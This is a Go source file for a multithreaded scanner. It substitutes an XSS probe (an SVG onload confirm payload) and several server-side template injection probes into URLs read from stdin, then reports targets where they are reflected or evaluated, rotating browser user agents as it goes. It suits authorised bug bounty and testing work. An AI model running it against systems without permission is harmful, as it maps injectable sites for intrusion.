package main

import (
	"bufio"
	"io/ioutil"
	"fmt"
	"math/rand"
	"net/http"
	"net/url"
	"os"
	"runtime"
	"strings"
	"sync"
	"time"
)

const (
	colorReset = "\033[0m"
	colorRed   = "\033[31m"
	colorGreen = "\033[32m"
)

var userAgents = []string{
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
	"Mozilla/5.0 (iPhone; CPU iPhone OS 17_1_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1",
}

func getRandomUserAgent() string {
	rand.Seed(time.Now().UnixNano())
	shuffledUserAgents := append([]string(nil), userAgents...)
	rand.Shuffle(len(shuffledUserAgents), func(i, j int) {
		shuffledUserAgents[i], shuffledUserAgents[j] = shuffledUserAgents[j], shuffledUserAgents[i]
	})
	return shuffledUserAgents[rand.Intn(len(shuffledUserAgents))]
}

func checkXSS(domain string) bool {
	client := http.Client{
		Timeout: 5 * time.Second,
	}

	req, err := http.NewRequest("GET", domain, nil)
	if err != nil {
		return false
	}

	req.Header.Set("User-Agent", getRandomUserAgent())

	resp, err := client.Do(req)
	if err != nil {
		return false
	}
	defer resp.Body.Close()

	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return false
	}

	content := string(body)
	return strings.Contains(content, "<Svg Only=1 OnLoad=confirm(1)>")
}

func replaceAndCheckXSS(originalDomain string) bool {
	payload := url.QueryEscape("<Svg Only=1 OnLoad=confirm(1)>")
	domain := strings.Replace(originalDomain, "FUZZ", payload, -1)
	return checkXSS(domain)
}

func checkSSTI(domain string) bool {
	client := http.Client{
		Timeout: 5 * time.Second,
	}

	req, err := http.NewRequest("GET", domain, nil)
	if err != nil {
		return false
	}

	req.Header.Set("User-Agent", getRandomUserAgent())

	resp, err := client.Do(req)
	if err != nil {
		return false
	}
	defer resp.Body.Close()

	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return false
	}

	content := string(body)
	return strings.Contains(content, "133700")
}

func replaceAndCheckSSTI(originalDomain string) bool {
	payload := url.QueryEscape("e{1337*100} e{{1337*100}} e${1337*100} e${{1337*100}} e#{1337*100} e<%= 1337*100 %> %{1337*100}")
	domain := strings.Replace(originalDomain, "FUZZ", payload, -1)
	return checkSSTI(domain)
}

func main() {
	sc := bufio.NewScanner(os.Stdin)

	jobs := make(chan string)
	var wg sync.WaitGroup

	numWorkers := runtime.NumCPU()

	for i := 0; i < numWorkers; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for originalDomain := range jobs {
				if replaceAndCheckXSS(originalDomain) {
					fmt.Println(colorRed, "Possible XSS :", originalDomain, colorReset)
				}
				if replaceAndCheckSSTI(originalDomain) {
					fmt.Println(colorRed, "Possible SSTI :", originalDomain, colorReset)
				}
			}
		}()
	}

	for sc.Scan() {
		originalDomain := sc.Text()
		jobs <- originalDomain
	}

	close(jobs)
	wg.Wait()
}
